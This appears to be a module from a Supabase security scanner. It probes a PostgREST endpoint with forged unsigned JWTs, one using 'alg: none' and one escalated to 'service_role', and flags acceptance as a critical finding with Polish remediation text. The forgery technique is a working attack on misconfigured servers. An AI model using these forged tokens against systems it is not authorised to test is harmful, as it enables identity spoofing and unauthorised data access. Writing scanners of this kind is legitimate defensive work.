"""JWT manipulation probes against Supabase REST."""

from __future__ import annotations

import httpx

from ...active.auth import decode_jwt, encode_unsigned_jwt
from ...models import Finding, ScanContext


async def _probe(client: httpx.AsyncClient, ctx: ScanContext, token: str) -> int:
    """Hit a benign REST endpoint; return status code."""
    url = f"{ctx.supabase_url}/rest/v1/profiles"
    try:
        r = await client.get(
            url,
            params={"select": "*", "limit": 1},
            headers={
                "apikey": ctx.supabase_anon_key or "",
                "Authorization": f"Bearer {token}",
            },
        )
        return r.status_code
    except httpx.HTTPError:
        return 0


async def run(ctx: ScanContext, client: httpx.AsyncClient) -> tuple[list[Finding], str | None]:
    if not ctx.session_jwt:
        return [], "wymaga zalogowanego użytkownika (--credentials)"
    if not ctx.supabase_url or not ctx.supabase_anon_key:
        return [], "nie wykryto Supabase URL/klucza"

    decoded = decode_jwt(ctx.session_jwt)
    if not decoded:
        return [], "nie udało się zdekodować JWT"
    header, payload = decoded

    # Baseline: what does the real token return?
    baseline = await _probe(client, ctx, ctx.session_jwt)
    findings: list[Finding] = []

    # (a) alg:none forged token
    forged_header = {**header, "alg": "none"}
    forged = encode_unsigned_jwt(forged_header, payload)
    status_a = await _probe(client, ctx, forged)
    if status_a == 200 and baseline == 200:
        findings.append(
            Finding(
                id="PE-01",
                severity="CRITICAL",
                title="JWT `alg: none` akceptowane przez serwer",
                evidence=f"Forged token (alg=none) zwrócił 200 na /rest/v1/profiles. Podpis nie jest weryfikowany.",
                recommendation="Ustaw w Supabase/PostgREST `JWT_SECRET` i upewnij się, że `alg:none` jest odrzucany. To krytyczny bug — atakujący może podrobić tożsamość dowolnego usera.",
                cvss=10.0,
                source="active",
            )
        )

    # (b) role escalation
    esc_payload = {**payload, "role": "service_role"}
    forged2 = encode_unsigned_jwt({**header, "alg": "none"}, esc_payload)
    status_b = await _probe(client, ctx, forged2)
    if status_b == 200 and baseline == 200:
        findings.append(
            Finding(
                id="PE-02",
                severity="CRITICAL",
                title="Eskalacja roli na `service_role` przez forged JWT",
                evidence="Token z `role: service_role` i `alg: none` uzyskał dostęp do /rest/v1/profiles.",
                recommendation="Service role key nie powinien być weryfikowalny od strony klienta. Upewnij się, że JWT validation wymaga podpisu.",
                cvss=10.0,
                source="active",
            )
        )

    return findings, None
